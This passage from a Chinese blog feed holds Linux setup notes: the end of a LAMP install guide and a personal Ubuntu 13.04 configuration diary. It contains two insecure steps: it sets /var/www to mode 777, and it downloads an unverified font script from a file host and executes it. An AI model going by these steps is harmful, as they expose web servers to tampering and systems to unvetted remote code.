class="line"></span><br></pre></td></tr></table></figure><p><span>建立链接。</span></p><p>phpmyadmin测试：在浏览器地址栏中打开http://localhost/phpmyadmin。</p><p>以上ALMP的基本组件就安装完毕了，下面我们再来看一些其他的设置：</p><p><span>步骤五，设置Ubuntu文件执行读写权限</span></p><p>LAMP组建安装好之后，PHP网络服务器根目录默认设置是在：/var/www。由于Linux系统的安全性原则，改目录下的文件读写权限是只允许root用户操作的，所以我们不能在www文件夹中新建php文件，也不能修改和删除，必须要先修改/var/www目录的读写权限。在界面管理器中通过右键属性不能修改文件权限，得执行root终端命令：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo chmod <span class="number">777</span> <span class="regexp">/var/</span>www</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>然后就可以写入html或php文件了。777是linux中的最高权限，表示可读，可写，可执行。</span></p><div><div id="highlighter_37055" class="syntaxhighlighter  cpp"><div class="toolbar"><p><span>转载自：<a title="http://www.comflag.com/2011/05/01/apache-web.htm" href="http://www.comflag.com/2011/05/01/apache-web.htm">http://www.comflag.com/2011/05/01/apache-web.htm</a></span></p></div></div></div>]]></content>
      
      
      <categories>
          
          <category> 后端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux学习笔记（上次更新时间2013/07/28）</title>
      <link href="/blog/2013/06/06/cb-linux-learning/"/>
      <url>/blog/2013/06/06/cb-linux-learning/</url>
      
        <content type="html"><![CDATA[<p>自从上次不小心把硬盘全部格式化之后，电脑里的几个系统，以及诸多配置都咔嚓了，没办法，又得从头来过。这个总结和记录了Linux学习过程中遇到的问题，以及电脑的配置等等，为下一次手贱做好准备。。。</p><p>P.S: 本次系统更换为 <span>unbuntu 13.04</span></p><h3>关于配置</h3><p><strong>1. 源</strong></p><p>软件中心 -》 编辑 -》软件源 -》</p><p>　　我一般是选择，163的源，速度还不错，听说最近我们学校也弄了一个源（<a href="http://mirrors.hustunique.com">http://mirrors.hustunique.com</a>），不知道写错没有，但是在系统中没有找到这个源，就将就着速度还不错的163源吧。</p><p>改完之后，更新一下源：</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sudo apt-<span class="built_in">get</span><span class="built_in"> upgrade</span></span><br><span class="line"><span class="built_in"></span></span><br></pre></td></tr></table></figure><p>这个也不错（太长了，折叠）&nbsp;</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">1</span>、首先备份Ubuntu <span class="number">11.04</span>源列表</span><br><span class="line"></span><br><span class="line">    sudo cp <span class="regexp">/etc/</span>apt<span class="regexp">/sources.list /</span>etc<span class="regexp">/apt/</span>sources.list.backup （备份下当前的源列表，有备无患嘛）</span><br><span class="line"></span><br><span class="line">    <span class="number">2</span>、修改更新源</span><br><span class="line">    sudo gedit <span class="regexp">/etc/</span>apt/sources.list （打开Ubuntu <span class="number">11.04</span>源列表文件）</span><br><span class="line"></span><br><span class="line">    <span class="number">3</span>、将下面的代码粘贴进去（\<span class="comment">#&quot;开头的那一行为注释，可以直接复制进文件中）</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">#台湾源</span></span><br><span class="line"></span><br><span class="line">deb http:<span class="regexp">//</span>tw.archive.ubuntu.com<span class="regexp">/ubuntu/</span> natty main universe restricted multiverse </span><br><span class="line">deb-src http:<span class="regexp">//</span>tw.archive.ubuntu.com<span class="regexp">/ubuntu/</span> natty main universe restricted multiverse </span><br><span class="line">deb http:<span class="regexp">//</span>tw.archive.ubuntu.com<span class="regexp">/ubuntu/</span> natty-security universe main multiverse restricted </span><br><span class="line">deb-src http:<span class="regexp">//</span>tw.archive.ubuntu.com<span class="regexp">/ubuntu/</span> natty-security universe main multiverse restricted </span><br><span class="line">deb http:<span class="regexp">//</span>tw.archive.ubuntu.com<span class="regexp">/ubuntu/</span> natty-updates universe main multiverse restricted </span><br><span class="line">deb-src http:<span class="regexp">//</span>tw.archive.ubuntu.com<span class="regexp">/ubuntu/</span> natty-updates universe main multiverse restricted</span><br><span class="line"></span><br><span class="line"><span class="comment">#网易 Ubuntu 11.04 源（速度很快）</span></span><br><span class="line"></span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.<span class="number">163</span>.com<span class="regexp">/ubuntu/</span> natty main universe restricted multiverse </span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.<span class="number">163</span>.com<span class="regexp">/ubuntu/</span> natty main universe restricted multiverse </span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.<span class="number">163</span>.com<span class="regexp">/ubuntu/</span> natty-security universe main multiverse restricted </span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.<span class="number">163</span>.com<span class="regexp">/ubuntu/</span> natty-security universe main multiverse restricted </span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.<span class="number">163</span>.com<span class="regexp">/ubuntu/</span> natty-updates universe main multiverse restricted </span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.<span class="number">163</span>.com<span class="regexp">/ubuntu/</span> natty-proposed universe main multiverse restricted </span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.<span class="number">163</span>.com<span class="regexp">/ubuntu/</span> natty-proposed universe main multiverse restricted </span><br><span class="line">deb http:<span class="regexp">//mi</span>rrors.<span class="number">163</span>.com<span class="regexp">/ubuntu/</span> natty-backports universe main multiverse restricted </span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.<span class="number">163</span>.com<span class="regexp">/ubuntu/</span> natty-backports universe main multiverse restricted </span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rrors.<span class="number">163</span>.com<span class="regexp">/ubuntu/</span> natty-updates universe main multiverse restricted</span><br><span class="line"></span><br><span class="line"> <span class="comment">#骨头源，骨头源是bones7456架设的一个Ubuntu源 ，提供ubuntu,deepin</span></span><br><span class="line"></span><br><span class="line">deb http:<span class="regexp">//u</span>buntu.srt.cn<span class="regexp">/ubuntu/</span> natty main universe restricted multiverse </span><br><span class="line">deb-src http:<span class="regexp">//u</span>buntu.srt.cn<span class="regexp">/ubuntu/</span> natty main universe restricted multiverse </span><br><span class="line">deb http:<span class="regexp">//u</span>buntu.srt.cn<span class="regexp">/ubuntu/</span> natty-security universe main multiverse restricted </span><br><span class="line">deb-src http:<span class="regexp">//u</span>buntu.srt.cn<span class="regexp">/ubuntu/</span> natty-security universe main multiverse restricted </span><br><span class="line">deb http:<span class="regexp">//u</span>buntu.srt.cn<span class="regexp">/ubuntu/</span> natty-updates universe main multiverse restricted </span><br><span class="line">deb http:<span class="regexp">//u</span>buntu.srt.cn<span class="regexp">/ubuntu/</span> natty-proposed universe main multiverse restricted </span><br><span class="line">deb-src http:<span class="regexp">//u</span>buntu.srt.cn<span class="regexp">/ubuntu/</span> natty-proposed universe main multiverse restricted </span><br><span class="line">deb http:<span class="regexp">//u</span>buntu.srt.cn<span class="regexp">/ubuntu/</span> natty-backports universe main multiverse restricted </span><br><span class="line">deb-src http:<span class="regexp">//u</span>buntu.srt.cn<span class="regexp">/ubuntu/</span> natty-backports universe main multiverse restricted </span><br><span class="line">deb-src http:<span class="regexp">//u</span>buntu.srt.cn<span class="regexp">/ubuntu/</span> natty-updates universe main multiverse restricted</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#大家可以自己根据自己的版本设置一下，不一定局限于ubuntu 11.04，下面列出一些校内更新源。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#电子科技大学</span></span><br><span class="line"></span><br><span class="line">deb http:<span class="regexp">//u</span>buntu.uestc.edu.cn<span class="regexp">/ubuntu/</span> natty main restricted universe multiverse</span><br><span class="line">deb http:<span class="regexp">//u</span>buntu.uestc.edu.cn<span class="regexp">/ubuntu/</span> natty-backports main restricted universe multiverse</span><br><span class="line">deb http:<span class="regexp">//u</span>buntu.uestc.edu.cn<span class="regexp">/ubuntu/</span> natty-proposed main restricted universe multiverse</span><br><span class="line">deb http:<span class="regexp">//u</span>buntu.uestc.edu.cn<span class="regexp">/ubuntu/</span> natty-security main restricted universe multiverse</span><br><span class="line">deb http:<span class="regexp">//u</span>buntu.uestc.edu.cn<span class="regexp">/ubuntu/</span> natty-updates main restricted universe multiverse</span><br><span class="line">deb-src http:<span class="regexp">//u</span>buntu.uestc.edu.cn<span class="regexp">/ubuntu/</span> natty main restricted universe multiverse</span><br><span class="line">deb-src http:<span class="regexp">//u</span>buntu.uestc.edu.cn<span class="regexp">/ubuntu/</span> natty-backports main restricted universe multiverse</span><br><span class="line">deb-src http:<span class="regexp">//u</span>buntu.uestc.edu.cn<span class="regexp">/ubuntu/</span> natty-proposed main restricted universe multiverse</span><br><span class="line">deb-src http:<span class="regexp">//u</span>buntu.uestc.edu.cn<span class="regexp">/ubuntu/</span> natty-security main restricted universe multiverse</span><br><span class="line">deb-src http:<span class="regexp">//u</span>buntu.uestc.edu.cn<span class="regexp">/ubuntu/</span> natty-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line"><span class="comment">#中国科技大学</span></span><br><span class="line"></span><br><span class="line">deb http:<span class="regexp">//</span>debian.ustc.edu.cn<span class="regexp">/ubuntu/</span> natty main restricted universe multiverse</span><br><span class="line">deb http:<span class="regexp">//</span>debian.ustc.edu.cn<span class="regexp">/ubuntu/</span> natty-backports restricted universe multiverse</span><br><span class="line">deb http:<span class="regexp">//</span>debian.ustc.edu.cn<span class="regexp">/ubuntu/</span> natty-proposed main restricted universe multiverse</span><br><span class="line">deb http:<span class="regexp">//</span>debian.ustc.edu.cn<span class="regexp">/ubuntu/</span> natty-security main restricted universe multiverse</span><br><span class="line">deb http:<span class="regexp">//</span>debian.ustc.edu.cn<span class="regexp">/ubuntu/</span> natty-updates main restricted universe multiverse</span><br><span class="line">deb-src http:<span class="regexp">//</span>debian.ustc.edu.cn<span class="regexp">/ubuntu/</span> natty main restricted universe multiverse</span><br><span class="line">deb-src http:<span class="regexp">//</span>debian.ustc.edu.cn<span class="regexp">/ubuntu/</span> natty-backports main restricted universe multiverse</span><br><span class="line">deb-src http:<span class="regexp">//</span>debian.ustc.edu.cn<span class="regexp">/ubuntu/</span> natty-proposed main restricted universe multiverse</span><br><span class="line">deb-src http:<span class="regexp">//</span>debian.ustc.edu.cn<span class="regexp">/ubuntu/</span> natty-security main restricted universe multiverse</span><br><span class="line">deb-src http:<span class="regexp">//</span>debian.ustc.edu.cn<span class="regexp">/ubuntu/</span> natty-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line"><span class="comment">#北京理工大学</span></span><br><span class="line"></span><br><span class="line">deb http:<span class="regexp">//mi</span>rror.bjtu.edu.cn<span class="regexp">/ubuntu/</span> natty main multiverse restricted universe</span><br><span class="line">deb http:<span class="regexp">//mi</span>rror.bjtu.edu.cn<span class="regexp">/ubuntu/</span> natty-backports main multiverse restricted universe</span><br><span class="line">deb http:<span class="regexp">//mi</span>rror.bjtu.edu.cn<span class="regexp">/ubuntu/</span> natty-proposed main multiverse restricted universe</span><br><span class="line">deb http:<span class="regexp">//mi</span>rror.bjtu.edu.cn<span class="regexp">/ubuntu/</span> natty-security main multiverse restricted universe</span><br><span class="line">deb http:<span class="regexp">//mi</span>rror.bjtu.edu.cn<span class="regexp">/ubuntu/</span> natty-updates main multiverse restricted universe</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rror.bjtu.edu.cn<span class="regexp">/ubuntu/</span> natty main multiverse restricted universe</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rror.bjtu.edu.cn<span class="regexp">/ubuntu/</span> natty-backports main multiverse restricted universe</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rror.bjtu.edu.cn<span class="regexp">/ubuntu/</span> natty-proposed main multiverse restricted universe</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rror.bjtu.edu.cn<span class="regexp">/ubuntu/</span> natty-security main multiverse restricted universe</span><br><span class="line">deb-src http:<span class="regexp">//mi</span>rror.bjtu.edu.cn<span class="regexp">/ubuntu/</span> natty-updates main multiverse restricted universe</span><br><span class="line"></span><br><span class="line"><span class="comment">#兰州大学</span></span><br><span class="line"></span><br><span class="line">deb ftp:<span class="regexp">//mi</span>rror.lzu.edu.cn<span class="regexp">/ubuntu/</span> natty main multiverse restricted universe</span><br><span class="line">deb ftp:<span class="regexp">//mi</span>rror.lzu.edu.cn<span class="regexp">/ubuntu/</span> natty-backports main multiverse restricted universe</span><br><span class="line">deb ftp:<span class="regexp">//mi</span>rror.lzu.edu.cn<span class="regexp">/ubuntu/</span> natty-proposed main multiverse restricted universe</span><br><span class="line">deb ftp:<span class="regexp">//mi</span>rror.lzu.edu.cn<span class="regexp">/ubuntu/</span> natty-security main multiverse restricted universe</span><br><span class="line">deb ftp:<span class="regexp">//mi</span>rror.lzu.edu.cn<span class="regexp">/ubuntu/</span> natty-updates main multiverse restricted universe</span><br><span class="line">deb ftp:<span class="regexp">//mi</span>rror.lzu.edu.cn<span class="regexp">/ubuntu-cn/</span> natty main multiverse restricted universe</span><br><span class="line"></span><br><span class="line"><span class="comment">#上海交通大学</span></span><br><span class="line"></span><br><span class="line">deb http:<span class="regexp">//</span>ftp.sjtu.edu.cn<span class="regexp">/ubuntu/</span> natty main multiverse restricted universe</span><br><span class="line">deb http:<span class="regexp">//</span>ftp.sjtu.edu.cn<span class="regexp">/ubuntu/</span> natty-backports main multiverse restricted universe</span><br><span class="line">deb http:<span class="regexp">//</span>ftp.sjtu.edu.cn<span class="regexp">/ubuntu/</span> natty-proposed main multiverse restricted universe</span><br><span class="line">deb http:<span class="regexp">//</span>ftp.sjtu.edu.cn<span class="regexp">/ubuntu/</span> natty-security main multiverse restricted universe</span><br><span class="line">deb http:<span class="regexp">//</span>ftp.sjtu.edu.cn<span class="regexp">/ubuntu/</span> natty-updates main multiverse restricted universe</span><br><span class="line">deb http:<span class="regexp">//</span>ftp.sjtu.edu.cn<span class="regexp">/ubuntu-cn/</span> natty main multiverse restricted universe</span><br><span class="line">deb-src http:<span class="regexp">//</span>ftp.sjtu.edu.cn<span class="regexp">/ubuntu/</span> natty main multiverse restricted universe</span><br><span class="line">deb-src http:<span class="regexp">//</span>ftp.sjtu.edu.cn<span class="regexp">/ubuntu/</span> natty-backports main multiverse restricted universe</span><br><span class="line">deb-src http:<span class="regexp">//</span>ftp.sjtu.edu.cn<span class="regexp">/ubuntu/</span> natty-proposed main multiverse restricted universe</span><br><span class="line">deb-src http:<span class="regexp">//</span>ftp.sjtu.edu.cn<span class="regexp">/ubuntu/</span> natty-security main multiverse restricted universe</span><br><span class="line">deb-src http:<span class="regexp">//</span>ftp.sjtu.edu.cn<span class="regexp">/ubuntu/</span> natty-updates main multiverse restricted universe</span><br><span class="line"></span><br><span class="line">View Code </span><br></pre></td></tr></table></figure><p><strong>&nbsp;2. 字体</strong></p><p>ubuntu自带的字体文泉字体，边缘很粗糙，不好看 ，我还是比较喜欢微软雅黑。</p><p>网上随便搜的一个，有兴趣的可以看看：</p><figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">用<span class="string">Ubuntu</span> 系统自带的文泉字体  边缘太模糊  ，所以就上网找了一些更换字体的方法  。跟着做了半天都没成功，后来  发现有个人写了一篇日志  ，编译好了，只需要 按着输入命令就行了  ，下面把方法贴出来</span><br><span class="line"><span class="string">http</span>://<span class="string">www</span>.<span class="string">idyj</span>.<span class="string">net</span>/<span class="string">blog</span>/<span class="string">read</span>.<span class="string">php</span>?<span class="string">5</span></span><br><span class="line"></span><br><span class="line">支持在<span class="string">Ubuntu8</span>.<span class="string">10</span>、<span class="string">Ubuntu9</span>.<span class="string">04</span>系统上自动安装微软雅黑、<span class="string">monaco-linux</span>、<span class="string">lucida-console</span>等字体。</span><br><span class="line">而且可以设置<span class="string">LED</span>、<span class="string">CRT</span>两种不同的显示器的渲染效果，无需手工配置，实现自动化安装。</span><br><span class="line">使用方法如下：</span><br><span class="line">打开命令控制台，然后运行下面的脚本（可以通过复制下面的内容到命令控制台来执行脚本）：</span><br><span class="line"><span class="string">wget</span> -<span class="string">O</span> <span class="built_in">get-fonts.sh.zip</span> <span class="string">http</span>://<span class="string">files</span>.<span class="string">cnblogs</span>.<span class="string">com</span>/<span class="string">DengYangjun</span>/<span class="built_in">get-fonts.sh.zip</span></span><br><span class="line"><span class="string">unzip</span> -<span class="string">o</span> <span class="built_in">get-fonts.sh.zip</span> <span class="string">1</span>&gt;/<span class="string">dev</span>/<span class="string">null</span></span><br><span class="line"><span class="string">chmod</span> <span class="string">a</span>+<span class="string">x</span> <span class="built_in">get-fonts.sh</span></span><br><span class="line">./<span class="built_in">get-fonts.sh</span></span><br><span class="line"></span><br><span class="line">删除下载的字体安装脚本文件：</span><br><span class="line"><span class="string">rm</span> <span class="built_in">get-fonts.sh</span> <span class="built_in">get-fonts.sh.zip</span> <span class="string">2</span>&gt;/<span class="string">dev</span>/<span class="string">null</span></span><br><span class="line"></span><br><span class="line">注销生效</span><br><span class="line"></span><br><span class="line">如果觉得不爽，想恢复以前的字体设置：</span><br><span class="line"><span class="string">cd</span> /<span class="string">etc</span>/<span class="string">fonts</span>/<span class="string">conf</span>.<span class="string">avail</span></span><br><span class="line"><span class="string">sudo</span> <span class="string">mv</span> <span class="string">51-local</span>.<span class="string">conf</span>.<span class="string">old</span> <span class="string">51-local</span>.<span class="string">conf</span> <span class="string">2</span>&gt;/<span class="string">dev</span>/<span class="string">null</span></span><br><span class="line"><span class="string">sudo</span> <span class="string">mv</span> <span class="string">69-language-selector-zh-cn</span>.<span class="string">conf</span>.<span class="string">old</span> <span class="string">69-language-selector-zh-cn</span>.<span class="string">conf</span> <span class="string">2</span>&gt;/<span class="string">dev</span>/<span class="string">null</span></span><br><span class="line"><span class="string">sudo</span> <span class="string">rm</span> -<span class="string">f</span> -<span class="string">r</span> /<span class="string">usr</span>/<span class="string">share</span>/<span class="string">fonts</span>/<span class="string">truetype</span>/<span class="string">myfonts</span> <span class="string">2</span>&gt;/<span class="string">dev</span>/<span class="string">null</span></span><br><span class="line"><span class="string">cd</span> -</span><br><span class="line"></span><br><span class="line">修正记录：</span><br><span class="line"><span class="comment">#1.添加了最新的Windows 7的微软雅黑字体。（附件大小限制，未实现）</span></span><br><span class="line"><span class="string">2</span>.修正了<span class="string">CRT</span>渲染的配置文件的链接错误。</span><br><span class="line"><span class="string">3</span>.添加字体：<span class="string">Agency</span> <span class="string">FB</span></span><br><span class="line"><span class="string">4</span>.添加字体设置恢复功能。</span><br><span class="line"></span><br><span class="line">附注：所有字体文件和安装脚本都通过网络下载，安装速度快慢由你的网络状况决定。</span><br><span class="line"></span><br><span class="line"><span class="string">View</span> <span class="string">Code</span> </span><br></pre></td></tr></table></figure><p><strong>3. 输入法</strong></p><p>这里为什么要说打字法。相比linux使用者都有一个很大的感触，智能提示太弱，一个原因是没有足够的本地词库，但如果词库加的太多会导致索引速度很慢，显得很卡。</p><p>如果你是在网页中打字的话，我建议你使用<strong>搜狗云输入法</strong>或者<strong>QQ云输入法，</strong>很赞哦~</p><p>在这里强调输入法的另外一个原因是，wineQQ和ibus输入法有一些兼容性问题，所以，可能你需要另外安装一个输入法。曾经我用的是谷歌输入法，还是不太好用。</p><p><strong>4. 翻围墙</strong></p><p>经常跟google打交道，所以用他的东西也是理所当然的啦，<a title="百度goagent" href="http://www.baidu.com/s?wd=goagent" target="_blank"><span>goAgent</span></a>，网上搜搜这个关键词吧，你肯定行的，步骤有些繁琐，但是一旦弄好了，你一定会爽到爆的！！！</p><p>多说几句，goAgent的包里面已经包含了&nbsp;SwitchySharp的配置文件，<span>/local/SwitchyOptions.bak</span></p><p>弄玩之后记得把证书导入进入，否则你会很蛋疼的～ 证书位置：<span> /local/CA.crt</span></p><p>&nbsp;好吧，你不要告诉我，你全部弄好了，但是你不会运行。。</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">python .<span class="regexp">/path/</span>local/proxy.py</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>为了方便下次使用，写个文件放到桌面，下次双击打开就好。</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cd ~/desktop</span><br><span class="line">vim proxy.sh</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>写入</span><br><span class="line">python .<span class="regexp">/path/</span>local/proxy.py</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>存盘</span><br><span class="line">:wq</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>5. 备份</strong></p><p><strong>6. 右键打开终端</strong></p><p>1）方法一：</p><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">sudo apt-get install nautilus-open-terminal</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面的方法比较直接，安装一个软件辅助就行，但是安装好了之后，需要注销之后才生效，应该可以在命令行里敲个什么代码，刷新当前状态之类的，这个我不是很清楚。</p><p>2）方法二：</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">cd ~<span class="regexp">/.gnome2/</span>nautilus-scriptssudo gedit open-terminal <span class="regexp">//</span>此处可以任意命名</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将下面代码拷贝进去，ctrl + s保存。</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This script opens a gnome-terminal in the directory you select.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Distributed under the terms of GNU GPL version 2 or later</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Install in ~/.gnome2/nautilus-scripts or ~/Nautilus/scripts</span></span><br><span class="line"><span class="comment"># You need to be running Nautilus 1.0.3+ to use scripts.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># When a directory is selected, go there. Otherwise go to current</span></span><br><span class="line"><span class="comment"># directory. If more than one directory is selected, show error.</span></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;$NAUTILUS_SCRIPT_SELECTED_FILE_PATHS&quot;</span> ]; then</span><br><span class="line">set <span class="variable">$NAUTILUS_SCRIPT_SELECTED_FILE_PATHS</span></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -eq <span class="number">1</span> ]; then</span><br><span class="line">destination=<span class="string">&quot;$1&quot;</span></span><br><span class="line"><span class="comment"># Go to file&#x27;s directory if it&#x27;s a file</span></span><br><span class="line"><span class="keyword">if</span> [ ! -d <span class="string">&quot;$destination&quot;</span> ]; then</span><br><span class="line">destination=<span class="string">&quot;`dirname &quot;</span><span class="variable">$destination</span><span class="string">&quot;`&quot;</span></span><br><span class="line">fi</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">zenity --error --title=<span class="string">&quot;Error - Open terminal here&quot;</span> \</span><br><span class="line">--text=<span class="string">&quot;You can only select one directory.&quot;</span></span><br><span class="line"><span class="keyword">exit</span> <span class="number">1</span></span><br><span class="line">fi</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">destination=<span class="string">&quot;`echo &quot;</span><span class="variable">$NAUTILUS_SCRIPT_CURRENT_URI</span><span class="string">&quot; | sed &#x27;s/^file:\/\///&#x27;`&quot;</span></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line"><span class="comment"># It&#x27;s only possible to go to local directories</span></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;`echo &quot;</span><span class="variable">$destination</span><span class="string">&quot; | grep &#x27;^[a-zA-Z0-9]\+:&#x27;`&quot;</span> ]; then</span><br><span class="line">zenity --error --title=<span class="string">&quot;Error - Open terminal here&quot;</span> \</span><br><span class="line">--text=<span class="string">&quot;Only local directories can be used.&quot;</span></span><br><span class="line"><span class="keyword">exit</span> <span class="number">1</span></span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">cd <span class="string">&quot;$destination&quot;</span></span><br><span class="line">exec x-terminal-emulator</span><br><span class="line"></span><br><span class="line">右键菜单代码</span><br></pre></td></tr></table></figure><p>然后修改下这段代码的权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x  ./open-terminal</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>7. 开机自启</strong></p><p>联网什么的最麻烦里，就希望一劳永逸，配置一次，以后不管里。</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">sudo gedit <span class="regexp">/etc/</span>rc.local</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">//</span>然后开始你的胡作非为</span><br><span class="line">mentohust <span class="regexp">//</span>我们学校最近好像禁用里mentohust，颇为蛋疼</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span>于是就只能用锐捷了</span><br><span class="line">.<span class="regexp">/path/</span>rujie.sh -uusername -ppassword -neth0 - sinternet -d0 -S1&lt;start sofeware-name</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在打开的文件中添加命令就行。</p><h3>关于软件</h3><p><strong>1. 浏览器</strong></p><p>我比较喜欢用的是chrome，在liunx下叫做<strong>chromium</strong>，这个东西和google帐号绑定，很多东西转移电脑也能够直接拿到。</p><p>我不知道chrome在发什么神经，安装好了之后，不停的刷新google首页，键入任何页面都自动reload到google首页。不能忍了！！！！　　</p><p>刚把chrome卸载，却有发现了解决方案，我次奥！！！所以说，遇到问题还是先到网上搜搜，没准儿能解决！</p><p>上面问题<strong>解决方案</strong>：</p><blockquote><p>a. 针对13.04版本下Chromium不断刷新网页问题，你在浏览器设置里面<strong>禁用掉"启用即搜即得\</strong>即可完美解决</p><p>b. 把网络关掉（自然就不能一直刷新了：），然后打开设置，点开自己的账户，把搜索里的即使搜索关掉就没事了。</p></blockquote><p>推荐几款chrome下开发工具：</p><p>　　1）<span> xmarks 从windows到linux</span>，很多收藏的网址就靠这个同步啦～</p><p>　　2） <span>coloZilla</span>，一款与firefox的rainbow类似的颜色吸取工具，搞前端必备啊！</p><p>　　3）&nbsp;<span><span>SwitchySharp</span>， 翻墙靠你了！！！</span></p><p><span>　　4）<span>&nbsp;</span><span><span>Quick Note</span>， 轻松作笔记</span></span></p><p><span><span>　　5）&nbsp;<span><span>Mobile Tester</span>， 当你弄移动端开发的时候，他可以被成为神器。</span></span></span></p><p><span><span><span>　　6） <span><span>FVD Video Downloader</span>，</span>&nbsp;神马？网页视频音频弄不下来，这个家伙帮你下载！</span></span></span></p><p><strong>2. 编辑器</strong></p><p>　　1）<span> Vim</span>， &nbsp;看一些朋友，这软件那真是玩的出神入化啊，他们不是在打字，是在高频弹指啊，尼玛，太快鸟！！！着玩意儿要多配置几个插件~</p><p>　　2）<span> Emacs</span>， 这个也很不错，不过我没用过，下次尝试着用它吧～</p><p>　　3） &nbsp;<span>Qt</span>， 搞C/C++开发的同学，推荐你用这家伙，集成度高，很给力。</p><p>　　4） <span>sublime text</span>， 个人最喜欢的一款软件，相当喜欢的说！！！无论是windows环境还是linux环境，都大爱sublime，现在都版本3了吧～</p><p>　　　　<a href="http://www.tuicool.com/topics/10100104">http://www.tuicool.com/topics/10100104</a></p><p><strong>3. 图形处理工具</strong></p><p><span>GIMP</span>，你懂的。等同于windows下的ps，当然界面略丑陋。</p><p><strong>4. QQ</strong></p><p>&nbsp;<span>wineQQ</span> ，现在版本是2012 beta3版，还行。（兼容性不好）</p><p><strong>P.S:</strong> <a href="http://www.cnblogs.com/hustskyking/archive/2013/06/06/linux-learning.html#2702894">@LovelyOu&nbsp;</a>说pidgin-lwqq不错，当然如果你对聊天界面没啥要求的话，这个也是个不错的插件~ 只是截图比较麻烦。</p><p>安装方式：</p><figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">sudo<span class="built_in"> add-apt-repository </span>ppa:lainme/pidgin-lwqq sudo apt-get update sudo apt-get install libpurple0 pidgin-lwqq</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><span>&nbsp;</span></p><p><strong>5. 影音</strong></p><p>&nbsp;<span>VLC media player</span>，这玩意儿不错，但是有两个烦人的点，<span>一是，中文乱码，二是，没有字幕</span>。（下次说解决方案）</p><p><strong>6. 截屏</strong></p><p>通常我用的是<span>shutter</span>，截图功能比较强大。</p><p><strong>7. Flashplayer</strong></p><p>这个在软件中心顺便弄上，chrome看视频，省得麻烦。</p><h3>一些问题</h3><p><strong>1. 多个软件同时安装</strong></p><blockquote><p>E: 无法获得锁 /var/lib/dpkg/lock - open (11: 资源暂时不可用)E: 无法锁定管理目录(/var/lib/dpkg/)，是否有其他进程正占用它？</p></blockquote><p>&nbsp;比如你的软件中心在安装软件或者更新源，结果你又在命令行里键入sudo apt-get install vim 之类的命令，此时系统是不会响应你的请求的，于是就有了上面这样的报错。</p><p><strong>2. 权限问题</strong></p><p>&nbsp;有的童鞋在网上搜罗里一些软件，结果安装的时候，发现出问题里，安装不了？不要着急，很多情况都是因为权限问题。</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">chmod +x <span class="regexp">/path/</span>filename <span class="regexp">//</span>+x的意思就是让他可以运行</span><br><span class="line"><span class="regexp">//</span>权限这一块不懂的可以去网速看看，这里不赘述。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>3.ubuntu-E:Encountered a section with no Package: header的解决办法</strong></p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">终端中输入以下两条命令：</span><br><span class="line">sudo rm <span class="regexp">/var/</span>lib<span class="regexp">/apt/</span>lists/* -vf</span><br><span class="line">sudo apt-get update</span><br><span class="line">执行完了命令之后，软件更新器应该会自动要求更新的，搞定。</span><br><span 